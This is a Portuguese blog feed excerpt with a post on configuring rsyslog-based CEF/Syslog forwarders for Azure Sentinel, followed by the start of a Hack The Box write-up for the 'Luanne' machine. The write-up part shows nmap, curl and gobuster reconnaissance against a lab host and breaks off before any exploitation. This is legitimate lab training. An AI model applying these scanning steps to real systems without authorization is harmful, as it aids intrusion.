&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;su omsagent &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'python /opt/microsoft/omsconfig/Scripts/OMS_MetaConfigHelper.py --disable'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A única coisa que não pode ser alterada no arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;95-omsagent.conf&lt;/code&gt; é a instrução de encaminhamento para &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@127.0.0.1:25224&lt;/code&gt;.&lt;/p&gt;

&lt;p class=&quot;notice--info&quot;&gt;:bulb: &lt;strong&gt;Nota&lt;/strong&gt;: Na sintaxe do syslogd uma arroba (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@&lt;/code&gt;) significa UDP enquanto duas arrobas (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@@&lt;/code&gt;) significam TCP.&lt;/p&gt;

&lt;p class=&quot;notice--warning&quot;&gt;:warning: &lt;strong&gt;Atenção&lt;/strong&gt;: No webinar citado anteriormente sobre um Dep Dive a respeito de CEF forwarder, Ofer também recomendou alterar as configurações do omsagent para aceitar as comunicações também via TCP para Syslog. Se seguir esta recomendação você deverá também ajustar qualquer instrução de encaminhamento para dois arrobas no arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;95-omsagent.conf&lt;/code&gt;, caso contrário suas mensagens poderão não ser enviadas ao Log Analytics.&lt;/p&gt;

&lt;h3 id=&quot;filtrando-eventos&quot;&gt;Filtrando eventos&lt;/h3&gt;

&lt;p&gt;Se você ainda estiver notando a ingestão de eventos desnecessários em sua workspace, você pode implementar um filtro na fonte assim como no encaminhador, o que normalmente é mais simples já que muitos appliances não suportam grande granularidade em suas configurações.&lt;/p&gt;

&lt;p&gt;Uma forma fácil de configurar esta filtragem é criando um arquivo a ser processando antes do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;60-cef.conf&lt;/code&gt; e &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;95-omsagent.conf&lt;/code&gt;, neste exemplo chamado de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;59-filter-out.conf&lt;/code&gt;, mas poderia utilizar qualquer nome que desejar, desde seja processado na ordem correta.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/tNsVYea.png&quot; alt=&quot;filtering out messages&quot; style=&quot;zoom:80%;&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Neste arquivo vamos utilizar novamente a instrução &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stop&lt;/code&gt;, removendo as mensagens que não gostaríamos que fossem encaminhadas seja como Syslog ou CEF. Neste exemplo qualquer mensagem que contenha a palavra “test” e tenha algum dos facilities/severidades mencionados serão removidas.&lt;/p&gt;

&lt;div class=&quot;language-ini highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;($rawmsg&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;contains&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;test&quot;)&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;prifilt(&quot;auth,authpriv.*&quot;)&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;then&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;err&quot;&gt;stop&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A documentação do rsyslog é muito rica em recursos mostrando &lt;a href=&quot;https://www.rsyslog.com/doc/master/configuration/filters.html&quot;&gt;como você pode filtrar&lt;/a&gt; estas mensagens, assim como &lt;a href=&quot;https://www.rsyslog.com/doc/master/configuration/properties.html&quot;&gt;quais propriedades&lt;/a&gt; se encontram disponíveis para que possa configurar estas instruções de forma mais avançada, incluindo dicas de &lt;a href=&quot;https://www.rsyslog.com/doc/v8-stable/configuration/converting_to_new_format.html&quot;&gt;conversão das instruções&lt;/a&gt; que utilizam sintaxe syslogd para o advanced, também conhecido como &lt;strong&gt;RainerScript&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Espero que este conteúdo tenha sido útil para aqueles que estão realizando o seu deployment ou manutenção de CEF/Syslog forwarders no seu ambiente!&lt;/p&gt;

&lt;p&gt;Você tem alguma configuração específica ou desafio não discutido aqui? Sinta-se à vontade para compartilhar nos comentários para que possamos complementar o post com mais detalhes, podendo assim auxiliar outros que estejam enfrentando o mesmo! :smile:&lt;/p&gt;</content><author><name>Davi Cruz</name></author><category term="Azure Sentinel" /><category term="Sentinel" /><category term="Syslog" /><category term="Rsyslog" /><category term="Linux" /><category term="Forwarder" /><category term="Collector" /><category term="CEF" /><summary type="html">Frequentemente apoio clientes no deployment de forwarders (encaminhadores) de logs CEF/Syslog em seus ambientes para coletar informações de appliances de rede e/ou servidores e serviços para o Log Analytics, que consequentemente os disponibiliza para o Azure Sentinel. Embora tenhamos uma diversidade de documentações em como fazer este deployment, assim como recursos de comunidade como o Tech Community e Webinars, compilei todos os pontos que normalmente reviso com meus clientes nestes engajamentos de deployment e revisão neste post para ajudar àqueles que estejam enfrentando algum desafio em seu ambiente. :newspaper: Edits: 30/04/2021 - Incluído seção Redução de mensagens repetidas Requisitos De acordo com a documentação oficial da Microsoft, os requisitos para este recurso são bastante simples, conforme listado abaixo: 4 CPUs e 8GB RAM, que é capaz de processar cerca de 8500 EPS (eventos por segundo) utilizando o rsyslog, de acordo com a documentação. Se estiver realizado este deployment no Azure você pode utilizar o SKU Standard_F4s_v2 que é otimizado para processamento e recomendado neste caso. Uma distribuição Linux em que o Microsoft Monitoring Agent (também conhecido como omsagent) seja suportado. Python versão 2.7 ou 3. Um dos serviços de syslog suportados instalado. Na maioria dos cenários que trabalhei utilizei o rsyslog, uma vez que normalmente é o pacote padrão na maioria das distribuições. Abaixo a lista das versões suportadas, também de acordo com a documentação: Rsyslog v8 Syslog-ng 2.1 - 3.22.1 Arquitetura do Forwarder A arquitetura da solução é bem simples: É composta por uma ou mais máquinas recebendo os logs em protocolo syslog via UDP, TCP ou TLS. Isso é alcançado a partir da configuração de listeners no rsyslog ou no syslog-ng, assim como quaisquer servidores syslog você tenha ou teve em execução em seu ambiente. As mensagens recebidas são encaminhadas para os listeners locais que são configurados no omsagent para ingestão como logs puros em Syslog (UDP/25224) ou CEF (TCP/25226). Mensagens são encaminhadas ao Log Analytics workspace de acordo com a sua configuração, acessíveis também ao Sentinel a partir da ativação da solução. Agora vou orientá-los quando aos detalhes da configuração desta infraestrutura e compartilhar algumas dicas de configurações mais detalhadas para mitigar alguns problemas e reduzir ingestão desnecessária no seu ambiente. Considerações de Design Antes de realizar o deploy/revisar a infraestrutura do seu forwarder, existem algumas perguntas que precisamos responder que auxiliarão na correta definição das suas configurações: Este forwarder receberá apenas mensagens CEF, Syslog ou ambos? Embora ambos os tipos de mensagens sejam recebidos via protocolo syslog, as mensagens CEF são formatadas de acordo com seu padrão pelo omsagent, disponibilizando cada campo em uma coluna própria no Log Analytics, enquanto as mensagens Syslog puro são armazenadas em uma única coluna, o que irá requerer esforço adicional quando necessário realizar a análise destes dados em alguma regra. Também, se você estiver utilizando o forwarder para ambos os tipos de logs, precisará impedir que mensagens enviadas do tipo CEF sejam armazenadas também como Syslog, o que irá incorrer em custo duplicado para sua workspace. Quais são os facilities e severidades, assim como tipos de mensagens e fontes que serão encaminhados ao Sentinel? Envio de dados em excesso ao Sentinel pode gerar alto custo se não filtrados adequadamente. Considere mapear os cenários de detecção de acordo com o MITRE ATT&amp;amp;CK Matrix Techniques que tem interesse investigar antes de enviar os dados. Desta forma você conseguirá evitar o envio de dados sem um propósito ao seu SIEM, que não lhe trarão nenhum retorno sobre o investimento feito tanto em armazenamento quanto no Sentinel. Quais são os requisitos de segurança para esta comunicação? Como descrito no post sobre boas práticas compartilhado por Cristhofer Romeo Muñoz, devemos utilizar TCP como o protocolo padrão para qualquer comunicação devido a sua confiabilidade, a menos que seu appliance apenas suporte UDP ou se necessite de criptografia na comunicação, adotando TLS quando o dado for transmitido pela internet ou se houver dados sensíveis a serem coletados. Instalando o forwarder próximo da fonte também ajuda a reduzir a complexidade dos protocolos utilizados, assim como evita que tenhamos problemas de performance causados por alta latencia na comunicação entre origem e forwarder. Instalação A instalação inicial pode ser facilmente realizada executando o script cef_installer.py, disponível no repositório oficial do Github utilizando a linha de comando abaixo, que pode ser obtida para seu ambiente acessando a página do conector Common Event Format (CEF) no Sentinel ou simplesmente substituir os dados &amp;lt;workspace id&amp;gt; e &amp;lt;workspace secret&amp;gt; pelos de sua workspace. :bulb: Nota: Se não tiver o python 2.7 na máquina deverá substituir a instrução python por python3 antes de executar a linha abaixo. sudo wget -O cef_installer.py https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/DataConnectors/CEF/cef_installer.py &amp;amp;&amp;amp; sudo python cef_installer.py &amp;lt;workspace id&amp;gt; &amp;lt;workspace secret&amp;gt; Se seu forwarder necessita de um proxy para comunicar-se com a Internet, você precisará também atualizar tais configurações modificando o arquivo /etc/opt/microsoft/omsagent/proxy.conf: proxyconf=&quot;http://user:password@proxyserver:3128&quot; #user:password can be ignored if you proxy doesn't require authentication sudo echo $proxyconf &amp;gt;&amp;gt;/etc/opt/microsoft/omsagent/proxy.conf sudo chown omsagent:omiusers /etc/opt/microsoft/omsagent/proxy.conf #restart service sudo /opt/microsoft/omsagent/bin/service_control restart Este script de instalação realiza as alterações listadas abaixo em seu sistema. A maioria delas necessita de conectividade com o Github uma vez que os assets utilizados estão armazenados no repositório oficial do Azure Sentinel: Download e instalação do Microsoft Monitoring Agent para Linux. Configuração do omsagent para ouvir na porta TCP/25226 e realizar o parsing das mensagens CEF a partir da cópia do arquivo security_events.conf dentro do diretório de configuração da workspace (/etc/opt/microsoft/omsagent/&amp;lt;workspaceID&amp;gt;/conf/omsagent.d). Encaminha as mensagens que contenham ASA ou CEF para a porta TCP/25226 a partir da cópia do arquivo security-config-omsagent.conf para /etc/rsyslog.d/ ou /etc/syslog-ng/conf.d/, dependendo do seu serviço de syslog. Habilita o serviço syslog para ouvir porta TCP/514 e UDP/514 a partir de edição do arquivo em /etc/rsyslog.conf ou /etc/syslog-ng/syslog-ng.conf. Com esta configuração você já estará preparado para encaminhar as mensagens CEF para este servidor, que em breve estarão disponíveis na sua workspace de Log Analytics na tabela CommonSecurityLog, mas existem algumas outras alterações aqui descritas das quais poderá se beneficiar para coletar logs Syslog puro, assim como implementar filtros e ajustes na infraestrutura. Configuração Como vimos a infraestrutura é baseada no serviço de syslog + omsagent. Uma vez que o rsyslog é um dos mais populares serviços utilizados e já disponível por padrão da maioria das distribuições atualmente, utilizarei todas as configurações aqui descritas para este serviço, embora você possa também ajustá-las para funcionamento com o syslog-ng caso necessário. Validação da versão e instalação do rsyslog Como mencionado em documentação, precisamos utilizar o rsyslog versão 8. Para confirmar a versão em execução em seu systema você pode executar o comando rsyslogd -v, que exibirá um output como o exemplo abaixo: $ rsyslogd -v rsyslogd 8.32.0, compiled with: PLATFORM: x86_64-pc-linux-gnu PLATFORM (lsb_release -d): FEATURE_REGEXP: Yes GSSAPI Kerberos 5 support: Yes FEATURE_DEBUG (debug build, slow code): No 32bit Atomic operations supported: Yes 64bit Atomic operations supported: Yes memory allocator: system default Runtime Instrumentation (slow code): No uuid support: Yes systemd support: Yes Number of Bits in RainerScript integers: 64 De acordo com a documentação do projeto, você não deve ter maiores problemas executando a versão do rsyslog disponível no repositório do mantenedor da distribuição a menos que eles não tenham portado alguma correção para ela. Neste caso você deverá baixar a última build para sua distribuição da página do projeto ou instalar a partir do código fonte. Aplicando as configurações do rsyslog Após quaisquer alterações feitas no arquivo de configuração do rsyslog (/etc/rsyslog.conf) ou qualquer outro arquivo por ele importado (normalmente em /etc/rsyslog.d/*.conf) você precisará reiniciar o serviço para que as alterações tenham efeito. Isso pode ser alcançado a partir da execução da linha de comando abaixo: sudo systemctl restart rsyslog.service Ajustando os listeners do rsyslog Embora o cef_installer.py já defina os listeners para TCP/514 e UDP/514, talvez haja a necessidade de validar ou ajustar a sua configuração para criptografar a comunicação via TLS. Sua configuração atual deve se parecer com o trecho abaixo, que pode ser visto no arquivo /etc/rsyslog.conf: module(load=&quot;imuxsock&quot;) # provides support for local system logging #module(load=&quot;immark&quot;) # provides --MARK-- message capability # provides UDP syslog reception module(load=&quot;imudp&quot;) input(type=&quot;imudp&quot; port=&quot;514&quot;) # provides TCP syslog reception module(load=&quot;imtcp&quot;) input(type=&quot;imtcp&quot; port=&quot;514&quot;) A configuração para comunicação via TLS requer alguns itens adicionais, onde é necessário emitir os certificados para servidores e clientes (caso não esteja utilizando uma infra de PKI) assim como alterar o arquivo de configuração do rsyslog para aceitar estas comunicações. Maiores detalhes e exemplos de configurações podem ser encontrados na documentação oficial neste link, de onde retirei o trecho abaixo para que tenham uma ideia de como esta configuração se parece: module(load=&quot;imuxsock&quot;) # local messages module(load=&quot;imtcp&quot; # TCP listener StreamDriver.Name=&quot;gtls&quot; StreamDriver.Mode=&quot;1&quot; # run driver in TLS-only mode StreamDriver.Authmode=&quot;anon&quot; ) # make gtls driver the default and set certificate files global( DefaultNetstreamDriver=&quot;gtls&quot; DefaultNetstreamDriverCAFile=&quot;/path/to/contrib/gnutls/ca.pem&quot; DefaultNetstreamDriverCertFile=&quot;/path/to/contrib/gnutls/cert.pem&quot; DefaultNetstreamDriverKeyFile=&quot;/path/to/contrib/gnutls/key.pem&quot; ) # start up listener at port 6514 input( type=&quot;imtcp&quot; port=&quot;6514&quot; ) Evitando registro de eventos remotos em arquivos locais Um ponto que é sempre questionado pelos clientes é que após configurar máquinas como forwarder para CEF e/ou Syslog os arquivos de log locais (frequentemente /var/log/messages ou /var/log/syslog) são sobrecarregados com mensagens oriundas de servidores remotos, e na maioria das vezes consumindo todo o espaço em disco disponível do volume onde /var/log reside. Isso ocorre porque as definições padrão do rsyslog, listadas abaixo, enviam alguns facilities e severidades para arquivos locais sem validar a fonte destes eventos (comentários e linhas em branco removidas por simplicidade). :bulb: Nota: O caminho onde encontrar estas configurações padrão variam de acordo com a distribuição Linux. Para Ubuntu existe um arquivo chamado /etc/rsyslog.d/50-default.conf enquanto para distribuições baseadas em RHEL (RHEL, CentOS, Fedora) está na configuração principal do /etc/rsyslog.conf. #Extracted from Ubuntu /etc/rsyslog.d/50-default.conf auth,authpriv.* /var/log/auth.log *.*;auth,authpriv.none -/var/log/syslog kern.* -/var/log/kern.log mail.* -/var/log/mail.log mail.err /var/log/mail.err *.emerg :omusrmsg:* Como podem ver, qualquer mensagem que coincida com alguma severidade contida nesta lista é enviada para um dos arquivos locais. Uma forma rápida de prevenir este comportamento é editar o arquivo de configuração para apenas aceitar mensagens geradas pelo host local (127.0.0.1): if ($fromhost-ip == '127.0.0.1') then { auth,authpriv.* /var/log/auth.log *.*;auth,authpriv.none -/var/log/syslog kern.* -/var/log/kern.log mail.* -/var/log/mail.log mail.err /var/log/mail.err *.emerg :omusrmsg:* } Redução de mensagens repetidas Conforme lembrado pelo meu colega Flavio Honda, o Rsyslog possui uma opção que pode auxiliar com a redução de mensagens repetidas. Se você sofre com este tipo de problema ou quer prevenir antes mesmo que venha acontecer em seu ambiente, você pode habilitar a configuração abaixo no seu arquivo /etc/rsyslog.conf :smile:. $RepeatedMsgReduction on A referência oficial sobre esta feature na documentação do RSyslog pode ser encontrada neste link. Fluxo de processamento de mensagens No rsyslog, o primeiro arquivo a ser processado é o rsyslog.conf, que normalmente contém uma instrução para importar todos os arquivos *.conf localizados no diretório /etc/rsyslog.d e os arquivos são processados em ordem alfabética. Quando uma mensagem chega ou é gerada no sistema, é encaminhada e avaliada por cada uma das configurações nesta mesma ordem, a menos que alteremos explicitamente este comportamento. Na configuração abaixo, vamos considerar que estamos encaminhando mensagens no formato CEF de um appliance que são enviadas com o facility local4.info: Se nenhuma alteração for realizada no rsyslog.conf ou 50-default.conf para prevenir o registro de mensagens de um host remoto, estas mensagens serão registradas no arquivo /var/log/syslog. Também, se houver algum match no arquivo 95-omsagent.conf esta mensagem será enviada para a workspace de Log Analytics como Syslog puro. E por fim, ele coincidirá com as regular expressions contidas no arquivo security-config-omsagent.conf e tratado como mensagem CEF para a tabela CommonSecurityLog. Isso não apenas resultará no disco cheio, mas também em cobrança duplicada para este mesmo evento, que será armazenado duas vezes no Log Analytics. Para evitar este comportamento, como Ofer Shezaf compartilhou em um dos Webinars da Comunidade de Segurança (Log Forwarder deep dive | Filtering CEF and Syslog events), vamos renomear o arquivo security-config-omsagent.conf para 60-cef.conf de forma que ele seja processado antes do 95-omsagent.conf. Adicionalmente, precisamos garantir que uma vez que as mensagens sejam encaminhadas para o TCP/25226 e tratadas como CEF sejam descartadas, o que é alcançado pelo uso da instrução stop. O Stop remove as mensagens do processamento do rsyslog. :bulb: Nota: Você poderá encontrar outras instruções que utilizem o stop como um til (~). Esta notação veio da syntax legado do syslogd Esta configuração ficaria da seguinte forma: $ cat /etc/rsyslog.d/60-cef.conf if ($rawmsg contains &quot;CEF:&quot;) or ($rawmsg contains &quot;ASA-&quot;) then { *.* @@127.0.0.1:25226 stop } Ajustando o 95-omsagent.conf Após a instalação inicial, o agente do MMA criará um arquivo de configuração no diretório do serviço syslog (/etc/rsyslog.d/95-omsagent.conf) em sincronismo com as configurações definidas no portal do Azure, navegando em sua workspace de Log Analytics &amp;gt; Agents Configuration &amp;gt; Syslog: Para a configuração acima o seguinte conteúdo será criado no arquivo, conforme abaixo: # OMS Syslog collection for workspace &amp;lt;workspace id&amp;gt; auth.=alert;auth.=crit;auth.=debug;auth.=emerg;auth.=err;auth.=info;auth.=notice;auth.=warning @127.0.0.1:25224 authpriv.=alert;authpriv.=crit;authpriv.=debug;authpriv.=emerg;authpriv.=err;authpriv.=info;authpriv.=notice;authpriv.=warning @127.0.0.1:25224 local3.=alert;local3.=crit;local3.=debug;local3.=emerg;local3.=err;local3.=info;local3.=notice;local3.=warning @127.0.0.1:25224 local4.=alert;local4.=crit;local4.=debug;local4.=emerg;local4.=err;local4.=info;local4.=notice;local4.=warning @127.0.0.1:25224 Mesmo que esta configuração seja extremamente simples de se fazer pelo portal, ela se aplica globalmente a todos os dispositivos Linux que possuem o omsagent conectado a esta workspace, ingerindo mais informação de que precisa dentro de sua workspace de Log Analytics se mais tipos de dados são selecionados que o necessário. Se precisa definir uma configuração diferente para algumas máquinas como os seus forwarders, é recomendado que se edite diretamente o arquivo 95-omsagent.conf adicionando ou removendo facilities e severidades dele, assim como construindo suas condições para que estes dados sejam enviados ao Azure mas precisamos impedir que este arquivo seja sincronizado com as definições no portal. O comando abaixo “quebra” o vínculo existente entre este arquivo e a configuração da workspace: sudo su omsagent -c 'python /opt/microsoft/omsconfig/Scripts/OMS_MetaConfigHelper.py --disable' A única coisa que não pode ser alterada no arquivo 95-omsagent.conf é a instrução de encaminhamento para @127.0.0.1:25224. :bulb: Nota: Na sintaxe do syslogd uma arroba (@) significa UDP enquanto duas arrobas (@@) significam TCP. :warning: Atenção: No webinar citado anteriormente sobre um Dep Dive a respeito de CEF forwarder, Ofer também recomendou alterar as configurações do omsagent para aceitar as comunicações também via TCP para Syslog. Se seguir esta recomendação você deverá também ajustar qualquer instrução de encaminhamento para dois arrobas no arquivo 95-omsagent.conf, caso contrário suas mensagens poderão não ser enviadas ao Log Analytics. Filtrando eventos Se você ainda estiver notando a ingestão de eventos desnecessários em sua workspace, você pode implementar um filtro na fonte assim como no encaminhador, o que normalmente é mais simples já que muitos appliances não suportam grande granularidade em suas configurações. Uma forma fácil de configurar esta filtragem é criando um arquivo a ser processando antes do 60-cef.conf e 95-omsagent.conf, neste exemplo chamado de 59-filter-out.conf, mas poderia utilizar qualquer nome que desejar, desde seja processado na ordem correta. Neste arquivo vamos utilizar novamente a instrução stop, removendo as mensagens que não gostaríamos que fossem encaminhadas seja como Syslog ou CEF. Neste exemplo qualquer mensagem que contenha a palavra “test” e tenha algum dos facilities/severidades mencionados serão removidas. if ($rawmsg contains &quot;test&quot;) and prifilt(&quot;auth,authpriv.*&quot;) then { stop } A documentação do rsyslog é muito rica em recursos mostrando como você pode filtrar estas mensagens, assim como quais propriedades se encontram disponíveis para que possa configurar estas instruções de forma mais avançada, incluindo dicas de conversão das instruções que utilizam sintaxe syslogd para o advanced, também conhecido como RainerScript. Espero que este conteúdo tenha sido útil para aqueles que estão realizando o seu deployment ou manutenção de CEF/Syslog forwarders no seu ambiente! Você tem alguma configuração específica ou desafio não discutido aqui? Sinta-se à vontade para compartilhar nos comentários para que possamos complementar o post com mais detalhes, podendo assim auxiliar outros que estejam enfrentando o mesmo! :smile:</summary></entry><entry><title type="html">Hackthebox write-up: Luanne</title><link href="https://davicruz.com/writeup/2021/03/htb-luanne/" rel="alternate" type="text/html" title="Hackthebox write-up: Luanne" /><published>2021-03-27T09:00:00-03:00</published><updated>2021-03-27T09:00:00-03:00</updated><id>https://davicruz.com/writeup/2021/03/htb-luanne</id><content type="html" xml:base="https://davicruz.com/writeup/2021/03/htb-luanne/">&lt;p&gt;Olá pessoal!&lt;/p&gt;

&lt;p&gt;A máquina desta semana será &lt;strong&gt;Luanne&lt;/strong&gt;, outra máquina Linux classificada como fácil do &lt;a href=&quot;https://www.hackthebox.eu&quot;&gt;Hack The Box&lt;/a&gt;, , criada por &lt;a href=&quot;https://app.hackthebox.eu/users/159204&quot;&gt;polarbearer&lt;/a&gt;.&lt;!--more--&gt;&lt;/p&gt;

&lt;p class=&quot;notice--info&quot;&gt;:information_source: &lt;strong&gt;Info&lt;/strong&gt;: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/H8PyuHc.png&quot; alt=&quot;HTB Luanne&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;enumeração&quot;&gt;Enumeração&lt;/h2&gt;

&lt;p&gt;Iniciado enumeração, como de costume, executando um scan rápido com o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para identificar os serviços publicados:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; quick 10.10.10.218
Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;will be slower.
Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-02-19 13:35 &lt;span class=&quot;nt&quot;&gt;-03&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.218
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.15s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 997 closed ports
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;NetBSD 20190418-hpn13v14-lpk&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey:
| 3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| 521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_ 256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open http nginx 1.19.0
| http-auth:
| HTTP/1.1 401 Unauthorized&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0D
|_ Basic &lt;span class=&quot;nv&quot;&gt;realm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
| http-robots.txt: 1 disallowed entry
|_/weather
|_http-server-header: nginx/1.19.0
|_http-title: 401 Unauthorized
9001/tcp open http Medusa httpd 1.12 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Supervisor process manager&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| http-auth:
| HTTP/1.1 401 Unauthorized&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0D
|_ Basic &lt;span class=&quot;nv&quot;&gt;realm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;default
|_http-server-header: Medusa/1.12
|_http-title: Error response
Service Info: OS: NetBSD&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:netbsd:netbsd
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;208.02 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;80tcp---serviço-http&quot;&gt;80/TCP - Serviço HTTP&lt;/h2&gt;

&lt;p&gt;Ao acessar a página inicial do serviço foi solicitada autenticação, para a qual não temos nenhum tipo de credencial até o momento. Um ponto que chama a atenção é o link para a porta 3000/TCP do localhost, sendo que estamos acessando de uma porta 80/TCP, provavelmente através de um proxy.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/29kTezx.png&quot; alt=&quot;HTB Luanne - 3000/TCP&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De acordo com o scan do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;, existe uma entrada no arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt;. Ao validá-lo integralmente encontramos uma informação importante sobre um diretório virtual &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/weather&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; http://10.10.10.218/robots.txt
User-agent: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
Disallow: /weather &lt;span class=&quot;c&quot;&gt;#returning 404 but still harvesting cities&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Com este dado podemos inferir que, mesmo com os errors 404, ainda deve existir algum serviço onde possamos realizar as consultas a respeito do tempo.&lt;/p&gt;

&lt;h3 id=&quot;gobuster&quot;&gt;Gobuster&lt;/h3&gt;

&lt;p&gt;Executando o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; em modo diretório, pude identificar o caminho &lt;strong&gt;forecast&lt;/strong&gt;, que foi chave para conseguirmos prosseguir nesta máquina:&lt;/p&gt;

